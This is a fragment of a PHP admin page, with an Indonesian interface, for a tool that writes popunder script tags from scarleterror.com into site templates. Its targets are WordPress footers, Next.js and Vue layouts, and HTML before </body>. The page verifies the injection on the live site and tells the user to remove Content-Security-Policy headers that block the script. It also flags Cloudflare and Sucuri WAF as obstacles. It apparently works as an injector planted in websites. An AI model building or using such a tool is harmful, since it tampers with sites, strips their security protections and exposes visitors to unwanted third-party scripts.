          <?= $verifyResult['count'] ?> kemunculan <code>scarleterror.com</code> ditemukan.
          <?php foreach ($verifyResult['urls'] as $u): ?>
            <span class="script-url">↳ <?= htmlspecialchars($u) ?></span>
          <?php endforeach ?>
          <span class="script-url" style="opacity:.4">Dicek di: <?= htmlspecialchars($verifyResult['siteUrl']) ?><?= $verifyResult['httpCode'] ? ' — HTTP ' . (int)$verifyResult['httpCode'] : '' ?></span>
        </div>
        <?php else: ?>
        <div class="verify-no">
          ✔ Website <strong>OK</strong> (HTTP <?= $verifyResult['httpCode'] ? (int)$verifyResult['httpCode'] : '?' ?>) — tapi script belum kedeteksi.<br>
          <span style="font-size:12px">Dicek di: <code><?= htmlspecialchars($verifyResult['siteUrl']) ?></code><br>
          Kemungkinan: cache belum clear, atau halaman ini tidak pakai template yang diinjeksi.</span>
        </div>
        <?php endif ?>
        <?php if (!empty($verifyResult['cspBlocks'])): ?>
        <div class="verify-err" style="margin-top:8px">
          ⛔ <strong>CSP Header memblokir script di browser!</strong><br>
          <span style="font-size:11px">Server mengirim: <code><?= htmlspecialchars($verifyResult['cspHeader']) ?></code><br>
          Browser tidak load script dari domain yang tidak diizinkan. Hapus via kartu Pemblokir di atas.</span>
        </div>
        <?php endif ?>
        <?php if (!empty($verifyResult['cloudflare'])): ?>
        <div style="margin-top:8px;font-size:12px;color:#94a3b8;background:#0f172a;border:1px solid #334155;border-radius:7px;padding:10px 12px">
          ☁ <strong>Cloudflare terdeteksi</strong> — Rocket Loader bisa delay/modify loading script. Matikan Rocket Loader di Cloudflare dashboard.
        </div>
        <?php endif ?>
        <?php if (!empty($verifyResult['sucuriWaf'])): ?>
        <div style="margin-top:8px;font-size:12px;color:#94a3b8;background:#0f172a;border:1px solid #334155;border-radius:7px;padding:10px 12px">
          🛡 <strong>Sucuri WAF terdeteksi</strong> — WAF bisa memblokir script dari domain luar.
        </div>
        <?php endif ?>
      <?php endif ?>

      <div id="upd" style="display:none">
        <hr class="divider">
        <form method="POST">
          <input type="hidden" name="act" value="update">
          <label>Script Baru — tempel tag &lt;script&gt;</label>
          <textarea name="scripts" rows="4"
            placeholder="<script src=&quot;https://scarleterror.com/...js&quot;></script>&#10;<script src=&quot;https://scarleterror.com/...js&quot;></script>"></textarea>
          <div class="btn-row">
            <button class="btn btn-primary" type="submit" <?= $writable ? '' : 'disabled' ?>>
              Update &amp; Inject
            </button>
            <button class="btn btn-ghost" type="button"
              onclick="document.getElementById('upd').style.display='none'">
              Batal
            </button>
          </div>
        </form>
      </div>
    </div>

    <?php elseif ($target): ?>
    <!-- ── Inject form ─────────────────────────────────────────────────────── -->
    <div class="card">
      <div class="card-title">Inject Script Popunder</div>
      <form method="POST">
        <input type="hidden" name="act" value="inject">
        <label>Tempel tag &lt;script&gt; di sini (bisa lebih dari satu baris)</label>
        <textarea name="scripts" rows="5"
          placeholder="<?= htmlspecialchars(
            "<script src=\"https://scarleterror.com/20/0d/e7/200de7495776168c37ffac9fc45044f5.js\"></script>\n" .
            "<script src=\"https://scarleterror.com/bd/18/f9/bd18f99e414fc7365f00356080896fa6.js\"></script>"
          ) ?>"></textarea>
        <p class="hint" style="margin-top:8px">
          <?php if ($platform['slug'] === 'wordpress'): ?>
            Script akan dimasukkan via <code>add_action('wp_footer', ...)</code> di akhir
            <code><?= htmlspecialchars($target['rel']) ?></code>.
          <?php elseif ($target['type'] === 'jsx'): ?>
            Script akan dimasukkan sebelum <code>&lt;/body&gt;</code> di JSX layout
            <code><?= htmlspecialchars($target['rel']) ?></code> (Next.js JSX script tags).
          <?php elseif ($target['type'] === 'vue'): ?>
            Script akan dimasukkan sebelum tag penutup <code>&lt;/template&gt;</code> di
            <code><?= htmlspecialchars($target['rel']) ?></code>.
          <?php else: ?>
            Script akan dimasukkan tepat sebelum <code>&lt;/body&gt;</code> di
            <code><?= htmlspecialchars($target['rel']) ?></code>.
          <?php endif ?>
        </p>
        <div class="btn-row">
          <button class="btn btn-primary" type="submit" <?= $writable ? '' : 'disabled' ?>>
            💉 Inject Sekarang
          </button>
        </div>
        <?php if (!$writable): ?>
        <p class="hint" style="color:#f87171;margin-top:8px">
          ✘ File tidak bisa ditulis. Jalankan <code>chmod 644 <?= htmlspecialchars($target['rel']) ?></code> dulu.
        </p>
        <?php endif ?>
      </form>
    </div>
    <?php endif ?>

  </div>
  </body>
  </html>
  <?php }
